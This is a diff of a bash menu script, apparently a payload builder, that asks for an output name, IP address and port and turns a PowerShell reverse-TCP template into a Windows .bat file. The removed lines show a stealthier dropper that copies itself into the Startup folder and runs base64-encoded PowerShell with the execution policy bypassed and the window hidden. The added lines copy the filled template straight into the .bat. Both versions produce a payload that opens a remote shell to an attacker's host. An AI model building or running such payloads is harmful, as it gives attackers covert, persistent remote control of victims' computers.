@@ -37,20 +37,15 @@ sleep 1
 elif [[ $menu == 02 || $menu == 2  ]]
 then
 echo""
-read -p $'\e\n[1;32mEnter The Output Name: \e[0m' ps_tcp
-read -p $'\e\n[1;32mEnter The IpAdress: \e[0m' ip
-read -p $'\e\n[1;32mEnter The Port: \e[0m' port
+read -p $'\e\n[1;32mOutput Name: \e[0m' ps_tcp
+read -p $'\e\n[1;32mIpAdress: \e[0m' ip
+read -p $'\e\n[1;32mPort: \e[0m' port
 cp script.vs powershell_reverse_tcp.txt
-sed -i 's/_ipaddress_/'$ip'/g' powershell_reverse_tcp.txt
-sed -i 's/_port_/'$port'/g' powershell_reverse_tcp.txt
-printf "\e\n[1;93m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[0m\n"
+sed -i 's/_ipbat_/'$ip'/g' powershell_reverse_tcp.txt
+sed -i 's/_portbat_/'$port'/g' powershell_reverse_tcp.txt
 sleep 1
-echo -e "@echo off" >> $ps_tcp.bat 
-echo -e "cd %temp%" >> $ps_tcp.bat
-echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
-echo -n "powershell -executionpolicy bypass -windowstyle hidden -noexit -nologo -e " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
+cp powershell_reverse_tcp.txt $ps_tcp.bat
 rm -rf powershell_reverse_tcp.txt
-sleep 1
 printf "\e[1;36m Payload Is Created SuccessFully.\e[0m\n"
 sleep 1
 printf "\e\n[1;32m Output Path\e[0m \e[1;31m$(pwd)/$ps_tcp.bat\e[0m"
@@ -78,4 +73,3 @@ printf "\e\n[1;5;31m-+-Invalid Option-+-\e[0m\n"
 printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
 sleep 3
 fi
-
